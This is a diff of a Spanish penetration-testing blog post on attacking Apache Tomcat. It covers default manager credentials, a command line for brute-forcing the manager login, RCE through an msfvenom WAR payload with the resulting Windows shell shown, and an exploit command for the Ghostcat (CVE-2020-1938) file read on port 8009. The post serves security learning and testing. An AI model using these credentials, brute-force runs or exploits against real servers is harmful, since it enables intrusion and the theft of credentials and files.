@@ -2,7 +2,7 @@
 date: 2022-10-29T00:20:05.000Z
 layout: post
 comments: true
-title: Subir archivo malicioso en tomcat
+title: Tomcat Hacking
 subtitle: 'WAR file'
 description: >-
 image: >-
@@ -16,6 +16,7 @@ tags:
   - default
   - credentials
   - apache
+  - Ghostcat
 author: Felipe Canales Cayuqueo
 paginate: true
 ---
@@ -28,6 +29,8 @@ Apache Tomcat es un servidor web de código abierto y contenedor de Servlet para
 También es posible obtener la versión visitando el directorio ```/docs/```.
 
 [![tomcat2](/images/tomcat2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcat2.png)
+
+### Credenciales por defecto
 
 Un directorio importante en tomcat es el "manager app" presente en ```/manager``` o ```/host-manager```, el cual muchas veces contiene alguna de las siguientes credenciales:
 
@@ -58,6 +61,8 @@ Un directorio importante en tomcat es el "manager app" presente en ```/manager``
 |tomcat       |<blank>   |
 |tomcat       |admin     |
 |tomcat       |changethis|
+
+### Fuerza Bruta
 
 Si no se encuentra la credencial se podría realizar fuerza bruta sobre el panel de login por medio del siguiente script en python:
 
@@ -114,6 +119,8 @@ El modo de uso es el siguiente:
 └─ python3 mgr_brute.py -U <dirección web> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 ```
 
+### Ejecución remota de código con archivo WAR
+
 Si ya obtuvimos acceso al "manager app", debemos crear nuestro payload por medio de ```msfvenom```:
 
 ```bash
@@ -163,9 +170,22 @@ Microsoft Windows [Version 10.0.17763.2114]
 C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>
 ```
 
-Dentro de las carpetas del servidor web hay ciertos archivos que son interesantes y se podrían aprovechar de visitar al explotar alguna vulnerabilidad como Local File Inclusion (LFI):
+### CVE-2020-1938 (LFI)
+
+[Ghostcat](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi) es una vulnerabilidad sin autenticación que permite devolver archivos arbitrarios desde cualquier lugar de la aplicación web, es decir un (LFI). Todas las versiones de Tomcat anteriores a 9.0.31, 8.5.51 y 7.0.100 son vulnerables.
+
+Dentro de las carpetas del servidor web hay ciertos archivos que son interesantes y se podrían aprovechar de visitar al explotar esta vulnerabilidad:
 
 * tomcat-users.xml: Almacena las credenciales del usuario y sus roles asignados.
 * WEB-INF/web.xml: Almacena información sobre las rutas utilizadas por la aplicación y las clases que manejan estas rutas.
 * WEB-INF/classes: Pueden contener lógica empresarial importante, así como información confidencial.
+
+Uso del exploit considerando de que el puerto debe ser el de Apache Jserv (ajp13) no el http.
+
+> Para obtener el exploit se debe hacer click donde dice Ghostcat.
+
+```bash
+┌──(root㉿kali)-[/tomcat]
+└─ python2 TomcatLFI.py <url> -p 8009 -f WEB-INF/web.xml
+```
 
